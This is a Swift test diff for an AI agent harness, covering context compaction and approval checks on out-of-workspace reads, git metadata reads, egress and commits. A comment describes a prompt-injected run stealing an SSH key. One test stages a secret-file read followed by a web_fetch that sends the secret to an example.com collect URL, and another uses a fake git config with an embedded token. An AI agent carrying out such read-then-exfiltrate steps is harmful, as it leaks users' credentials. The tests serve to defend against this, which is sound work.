@@ -1445,6 +1445,31 @@ final class SubagentLoopTests: XCTestCase {
         )
     }
 
+    /// A bound that returns the history unchanged is not a bound. With two
+    /// huge turns there was nothing to fold (the recent window is kept
+    /// verbatim) and nothing to drop (a short history has no aged block), so
+    /// the loop returned a prompt that overflowed the budget and the engine
+    /// refused the step. The hard trim works oldest-first, so the newest turn
+    /// is the last thing to lose anything.
+    func testCompactionIsAHardBoundWithOnlyTwoHugeTurns() {
+        let huge = String(repeating: "x", count: HeadlessAgentLoop.contextCharacterBudget)
+        let messages: [AgentBackendMessage] = [
+            .user("Do the task."),
+            .assistant(text: huge, thinking: "", calls: []),
+            .toolResult(callId: "c1", name: "file_read", content: huge, isError: false),
+            .assistant(text: huge, thinking: "", calls: [])
+        ]
+        let compacted = HeadlessAgentLoop.compactContextIfNeeded(messages)
+        let total = compacted.reduce(0) { $0 + $1.textAndThinkingCount }
+        XCTAssertLessThanOrEqual(total, HeadlessAgentLoop.contextCharacterBudget)
+        XCTAssertEqual(compacted.count, messages.count, "the shape is kept; only the text shrinks")
+        if case .user(let task) = compacted[0] {
+            XCTAssertEqual(task, "Do the task.", "the task is never dropped")
+        } else {
+            XCTFail("the task must still lead the history")
+        }
+    }
+
     /// The prefix-pin contract: while the history is under the character
     /// budget it comes back UNCHANGED even when it has aged well past the kept
     /// window, because folding rewrites bytes in the middle of the prompt and
@@ -2145,6 +2170,237 @@ final class SubagentLoopTests: XCTestCase {
             findings.contains(where: { $0.claim.hasPrefix("Actual numbered bullet claim") }),
             "\(findings)"
         )
+    }
+
+    // MARK: - The read half of containment (PR #104 review, blocker 3)
+
+    /// An absolute path outside the run's workspace used to be read with NO
+    /// card in every policy: `resolvePath` returns it verbatim and no read tool
+    /// checked containment, so a prompt-injected run could read
+    /// `~/.ssh/id_ed25519` and post it out with its own egress tools.
+    func testAReadOutsideTheWorkspaceNeedsACard() async throws {
+        let workspace = try makeWorkspace()
+        defer { try? FileManager.default.removeItem(at: workspace) }
+        let outsideDirectory = try makeWorkspace()
+        defer { try? FileManager.default.removeItem(at: outsideDirectory) }
+        let secret = outsideDirectory.appendingPathComponent("id_ed25519")
+        try "PRIVATE KEY".write(to: secret, atomically: true, encoding: .utf8)
+
+        let counter = CallCounter()
+        let harness = try makeRunScopedHarness(
+            tools: ["file_read"],
+            workspace: workspace,
+            handler: { request in
+                counter.increment()
+                XCTAssertEqual(request.toolName, "file_read")
+                XCTAssertTrue(request.reason.contains("outside the run's work files"), request.reason)
+                return false
+            }
+        )
+        let result = await harness.executeTool(
+            call: ParsedToolCall(name: "file_read", arguments: ["path": secret.path], rawArguments: "{}", rawText: ""),
+            workingDirectory: workspace,
+            mode: .code
+        )
+
+        XCTAssertEqual(counter.count, 1, "an out-of-workspace read must produce a card")
+        XCTAssertEqual(result.record.status, .rejected)
+        XCTAssertFalse(result.resultJSON.contains("PRIVATE KEY"), "a declined card must not leak the file")
+    }
+
+    /// The containment rule must not turn ordinary work into click-through.
+    func testAReadInsideTheWorkspaceStaysCardlessInAReadOnlyRun() async throws {
+        let workspace = try makeWorkspace()
+        defer { try? FileManager.default.removeItem(at: workspace) }
+        let file = workspace.appendingPathComponent("Notes.txt")
+        try "ORDINARY_WORK".write(to: file, atomically: true, encoding: .utf8)
+
+        let counter = CallCounter()
+        let harness = try makeRunScopedHarness(
+            tools: ["file_read"],
+            workspace: workspace,
+            handler: { _ in
+                counter.increment()
+                return false
+            }
+        )
+        let result = await harness.executeTool(
+            call: ParsedToolCall(name: "file_read", arguments: ["path": "Notes.txt"], rawArguments: "{}", rawText: ""),
+            workingDirectory: workspace,
+            mode: .code
+        )
+
+        XCTAssertEqual(counter.count, 0, "a read inside the workspace is the run's own work")
+        XCTAssertEqual(result.record.status, .success)
+        XCTAssertTrue(result.resultJSON.contains("ORDINARY_WORK"))
+    }
+
+    /// A `.git/config` read is a credential surface (a remote URL can embed a
+    /// token) and is not work content, exactly like the write-side rule.
+    func testAGitMetadataReadNeedsACard() async throws {
+        let workspace = try makeWorkspace()
+        defer { try? FileManager.default.removeItem(at: workspace) }
+        let gitDirectory = workspace.appendingPathComponent(".git", isDirectory: true)
+        try FileManager.default.createDirectory(at: gitDirectory, withIntermediateDirectories: true)
+        try "[remote \"origin\"]\n\turl = https://user:token@example.com/repo.git\n"
+            .write(to: gitDirectory.appendingPathComponent("config"), atomically: true, encoding: .utf8)
+
+        let counter = CallCounter()
+        let harness = try makeRunScopedHarness(
+            tools: ["file_read"],
+            workspace: workspace,
+            handler: { request in
+                counter.increment()
+                XCTAssertTrue(request.reason.contains("git metadata"), request.reason)
+                return false
+            }
+        )
+        let result = await harness.executeTool(
+            call: ParsedToolCall(name: "file_read", arguments: ["path": ".git/config"], rawArguments: "{}", rawText: ""),
+            workingDirectory: workspace,
+            mode: .code
+        )
+
+        XCTAssertEqual(counter.count, 1)
+        XCTAssertEqual(result.record.status, .rejected)
+    }
+
+    /// Containment alone cannot stop the leak: a secret committed INSIDE the
+    /// workspace is readable cardlessly. Once the run has read outside its
+    /// workspace, egress is the other half and gets a card.
+    func testEgressIsCardedAfterTheRunReadOutsideItsWorkspace() async throws {
+        let workspace = try makeWorkspace()
+        defer { try? FileManager.default.removeItem(at: workspace) }
+        let outsideDirectory = try makeWorkspace()
+        defer { try? FileManager.default.removeItem(at: outsideDirectory) }
+        let secret = outsideDirectory.appendingPathComponent("token")
+        try "s3cr3t".write(to: secret, atomically: true, encoding: .utf8)
+
+        let asked = AskedToolRecorder()
+        let harness = try makeRunScopedHarness(
+            tools: ["file_read", "web_fetch"],
+            workspace: workspace,
+            handler: { request in
+                asked.record(request.toolName)
+                return false
+            }
+        )
+        _ = await harness.executeTool(
+            call: ParsedToolCall(name: "file_read", arguments: ["path": secret.path], rawArguments: "{}", rawText: ""),
+            workingDirectory: workspace,
+            mode: .code
+        )
+        let fetched = await harness.executeTool(
+            call: ParsedToolCall(
+                name: "web_fetch",
+                arguments: ["url": "https://example.com/collect?body=s3cr3t"],
+                rawArguments: "{}",
+                rawText: ""
+            ),
+            workingDirectory: workspace,
+            mode: .code
+        )
+
+        XCTAssertEqual(asked.tools, ["file_read", "web_fetch"])
+        XCTAssertEqual(fetched.record.status, .rejected)
+        XCTAssertTrue(harness.runHasReadOutsideWorkspace)
+    }
+
+    /// A run that has only read its own workspace can still fetch: the rule is
+    /// taint-tracking, not a card on every web call.
+    func testEgressStaysCardlessUntilTheRunReadsOutsideItsWorkspace() async throws {
+        let workspace = try makeWorkspace()
+        defer { try? FileManager.default.removeItem(at: workspace) }
+        let counter = CallCounter()
+        let harness = try makeRunScopedHarness(
+            tools: ["web_fetch"],
+            workspace: workspace,
+            handler: { _ in
+                counter.increment()
+                return false
+            }
+        )
+        // An invalid URL fails inside the tool without a request, so this
+        // proves no card was asked and never touches the network.
+        let result = await harness.executeTool(
+            call: ParsedToolCall(name: "web_fetch", arguments: ["url": "not a url"], rawArguments: "{}", rawText: ""),
+            workingDirectory: workspace,
+            mode: .code
+        )
+
+        XCTAssertEqual(counter.count, 0)
+        XCTAssertNotEqual(result.record.status, .rejected)
+        XCTAssertFalse(harness.runHasReadOutsideWorkspace)
+    }
+
+    /// A cardless `git_commit` is authorised by re-verifying the worktree's
+    /// linkage, which needs the recorded repository root. Without it the guard
+    /// used to be skipped entirely (`if let repositoryRoot`) and the commit
+    /// landed unverified.
+    func testACardlessGitCommitIsRefusedWithoutARecordedRepositoryRoot() async throws {
+        let workspace = try makeWorkspace()
+        defer { try? FileManager.default.removeItem(at: workspace) }
+        let harness = try makeRunScopedHarness(
+            tools: ["git_commit"],
+            workspace: workspace,
+            policy: .spawnOnly,
+            isolated: true,
+            handler: { _ in
+                XCTFail("an isolated git_commit is cardless only when its linkage can be proven")
+                return false
+            }
+        )
+        let result = await harness.executeTool(
+            call: ParsedToolCall(
+                name: "git_commit",
+                arguments: ["message": "work"],
+                rawArguments: "{}",
+                rawText: ""
+            ),
+            workingDirectory: workspace,
+            mode: .code
+        )
+
+        XCTAssertEqual(result.record.status, .withheld)
+        XCTAssertTrue(result.record.error?.contains("repository root is unknown") == true, result.record.error ?? "")
+    }
+
+    private func makeRunScopedHarness(
+        tools: [String],
+        workspace: URL,
+        policy: AgentApprovalPolicy = .auto,
+        isolated: Bool = false,
+        handler: (@Sendable (AgentApprovalRequest) async -> Bool)? = nil
+    ) throws -> AgentHarness {
+        let harness = AgentHarness.makeRunScoped()
+        try harness.configureRunScope(
+            runId: UUID(),
+            toolNames: tools,
+            workingDirectory: workspace,
+            mode: .code,
+            approvalPolicy: policy,
+            workspaceIsolated: isolated,
+            approvalHandler: handler
+        )
+        return harness
+    }
+}
+
+/// Records the tool names a handler was asked about, in order.
+nonisolated private final class AskedToolRecorder: @unchecked Sendable {
+    private let lock = NSLock()
+    private var names: [String] = []
+
+    func record(_ name: String) {
+        lock.lock()
+        names.append(name)
+        lock.unlock()
+    }
+
+    var tools: [String] {
+        lock.lock()
+        defer { lock.unlock() }
+        return names
     }
 }
 
